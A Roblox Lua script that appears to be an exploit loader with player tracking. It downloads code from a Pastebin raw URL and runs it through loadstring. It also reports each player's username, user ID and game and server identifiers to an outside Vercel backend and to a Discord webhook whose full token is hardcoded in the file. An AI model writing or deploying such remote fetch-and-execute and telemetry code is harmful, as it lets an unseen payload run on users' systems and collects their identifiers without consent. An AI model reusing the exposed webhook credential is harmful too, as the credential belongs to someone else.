local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

-- CONFIGURATION
local BACKEND_BASE_URL = "https://backend-vercel-ashy.vercel.app/api"
local REGISTER_URL = BACKEND_BASE_URL .. "/register.js"
local INSTANCE_URL = BACKEND_BASE_URL .. "/instance"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
local EXTERNAL_SCRIPT_URL = "https://pastebin.com/raw/pfpzbXiF"

local REPORT_INTERVAL = 300 -- 5 minutes
local DEBUG_MODE = true

-- System variables
local player = Players.LocalPlayer
local currentInstanceId = game.JobId
local isRunning = true

-- ====================== [UTILITY FUNCTIONS] ======================

local function log(message)
    if DEBUG_MODE then
        print("[Logger] " .. message)
    end
end

local function makeBackendRequest(url, method, data)
    local success, response = pcall(function()
        return HttpService:RequestAsync({
            Url = url,
            Method = method,
            Headers = {
                ["Content-Type"] = "application/json",
                ["X-Game-ID"] = tostring(game.GameId),
                ["X-Player-ID"] = tostring(player.UserId)
            },
            Body = data and HttpService:JSONEncode(data)
        })
    end)
    
    if success then
        return true
    else
        log("Request failed to " .. url .. ": " .. tostring(response))
        return false
    end
end

local function sendToWebhook(message)
    local backendWebhookURL = "https://webhook-git-main-ahmadsaukanihsbs-projects.vercel.app/?webhook=" ..
        HttpService:UrlEncode(WEBHOOK_URL) .. "&content=" .. HttpService:UrlEncode(message)

    local success, response = pcall(function()
        return HttpService:GetAsync(backendWebhookURL)
    end)

    if not success then
        log("‚ùå Gagal mengirim webhook ke backend: " .. tostring(response))
    else
        log("‚úÖ Webhook berhasil dikirim via backend")
    end
end

-- ====================== [DATABASE LOGGING] ======================

local function registerPlayer()
    local data = {
        username = player.Name,
        userId = player.UserId,
        instanceId = currentInstanceId,
        placeId = game.PlaceId,
        gameId = game.GameId,
        timestamp = os.time()
    }
    
    return makeBackendRequest(REGISTER_URL, "POST", data)
end

local function updateInstanceStatus(status, extraData)
    local data = {
        player = player.Name,
        userId = player.UserId,
        instanceId = currentInstanceId,
        placeId = game.PlaceId,
        gameId = game.GameId,
        status = status,
        timestamp = os.time()
    }
    
    if extraData then
        for k, v in pairs(extraData) do
            data[k] = v
        end
    end
    
    return makeBackendRequest(INSTANCE_URL, "POST", data)
end

-- ====================== [SCRIPT MONITORING] ======================

local function executeExternalScript()
    local success, content = pcall(function()
        return game:HttpGet(EXTERNAL_SCRIPT_URL, true)
    end)
    
    if not success then
        log("Failed to fetch external script: " .. tostring(content))
        return false
    end
    
    local fn, err = loadstring(content)
    if not fn then
        log("Failed to load external script: " .. tostring(err))
        return false
    end
    
    local success, result = pcall(fn)
    if not success then
        log("Script execution failed: " .. tostring(result))
        return false
    end
    
    return true
end

-- ====================== [MAIN LOGIC] ======================

local function periodicReporting()
    while isRunning do
        updateInstanceStatus("active")
        task.wait(REPORT_INTERVAL)
    end
end

local function initialize()
    log("Initializing player logger for " .. player.Name)
    sendToWebhook("üîπ Logger started for " .. player.Name)
    
    -- Initial registration
    if registerPlayer() then
        log("Successfully registered player")
    else
        log("Failed to register player")
    end
    
    -- Start periodic reporting
    spawn(periodicReporting)
    
    -- Track script execution
    updateInstanceStatus("script_started")
    
    local scriptSuccess = executeExternalScript()
    
    if scriptSuccess then
        updateInstanceStatus("script_completed")
        sendToWebhook("‚úÖ Script executed successfully for " .. player.Name)
    else
        updateInstanceStatus("script_failed", {error = "External script execution failed"})
        sendToWebhook("‚ùå Script execution failed for " .. player.Name)
    end
end

-- Cleanup function
local function shutdown()
    isRunning = false
    updateInstanceStatus("stopped")
    sendToWebhook("üõë Logger stopped for " .. player.Name)
end

-- Handle graceful shutdown
game:GetService("UserInputService").InputEnded:Connect(function(input, processed)
    if input.KeyCode == Enum.KeyCode.End then
        shutdown()
    end
end)

-- Start the logger
local success, err = pcall(initialize)
if not success then
    updateInstanceStatus("initialization_failed", {error = tostring(err)})
    sendToWebhook("üí• Logger initialization failed:\n```lua\n" .. tostring(err) .. "\n```")
end
